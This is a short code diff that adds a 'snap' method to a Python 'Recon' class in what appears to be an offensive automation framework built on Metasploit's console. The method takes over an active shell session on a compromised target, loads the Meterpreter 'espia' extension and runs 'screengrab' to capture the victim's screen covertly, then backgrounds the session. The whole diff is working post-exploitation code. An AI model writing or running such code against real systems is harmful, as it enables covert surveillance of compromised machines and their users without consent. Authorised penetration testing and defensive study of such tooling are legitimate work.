@@ -205,6 +205,24 @@ class Recon(object):
         target = config.TARGETS[target_name]
         config.COMMANDS.scan_import(scan_type, target_name)
 
+    def snap(self, target_name, verbose = True):
+        """
+        Copy the targets current screen display
+        """
+        target = config.TARGETS[target_name]
+        if not target.session_id:
+            raise Exception("shell session with target not active")
+            return
+        # open session with target
+        config.MSFCONSOLE.open_session(target_name)
+        # execute
+        cmd = "use espia"
+        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True, wait=2)
+        cmd = "screengrab"
+        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True, wait=1)
+        # background session
+        config.MSFCONSOLE.background_session(target_name)
+
 
 
 
